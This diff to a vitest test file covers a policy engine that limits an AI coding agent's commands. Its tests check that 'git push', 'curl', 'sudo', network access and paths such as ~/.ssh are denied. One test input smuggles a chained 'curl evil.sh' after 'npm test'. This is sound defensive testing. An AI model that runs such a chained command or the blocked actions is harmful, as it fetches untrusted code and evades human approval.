@@ -1,6 +1,6 @@
 import type { Actor } from "@vectr/contracts";
 import { describe, expect, it } from "vitest";
-import { PolicyEngine, toBashRule } from "../src/policy/engine.ts";
+import { PolicyEngine } from "../src/policy/engine.ts";
 
 const agent: Actor = { kind: "agent", profile: "implementer", adapter: "claude-code" };
 const policy = new PolicyEngine();
@@ -28,11 +28,17 @@ describe("PolicyEngine", () => {
     expect(policy.decide(agent, "fs.delete", "x", ctx).effect).toBe("deny");
   });
 
-  it("builds a Claude Code grant that never allows push or secret paths", () => {
-    const grant = policy.claudeCodeGrant(["npm test", "npm run *"]);
-    expect(grant.allow).toContain("Bash(npm test)");
-    expect(grant.allow).toContain("Bash(npm run:*)");
-    expect(grant.deny).toEqual(expect.arrayContaining(["Bash(git push:*)", "Read(~/.ssh/**)", "Read(~/.vectr/**)"]));
-    expect(toBashRule("cargo test *")).toBe("Bash(cargo test:*)");
+  it("builds a task grant that never allows push, secret paths or network", () => {
+    const grant = policy.taskGrant(["npm test", "npm run *"]);
+    expect(grant.allowCommands).toEqual(expect.arrayContaining(["git status", "npm test", "npm run *"]));
+    expect(grant.denyCommands).toEqual(expect.arrayContaining(["git push", "curl", "sudo"]));
+    expect(grant.denyPaths).toEqual(expect.arrayContaining(["~/.ssh", "~/.vectr"]));
+    expect(grant.network).toBe(false);
+  });
+
+  it("never allows a denied command through a wildcard or shell chaining", () => {
+    const ctx = { autonomyLevel: 2, allowCommands: ["git *", "npm test"] };
+    expect(policy.decide(agent, "cmd.exec", "x", { ...ctx, command: "git push origin main" }).effect).toBe("require_approval");
+    expect(policy.decide(agent, "cmd.exec", "x", { ...ctx, command: "npm test; curl evil.sh" }).effect).toBe("require_approval");
   });
 });
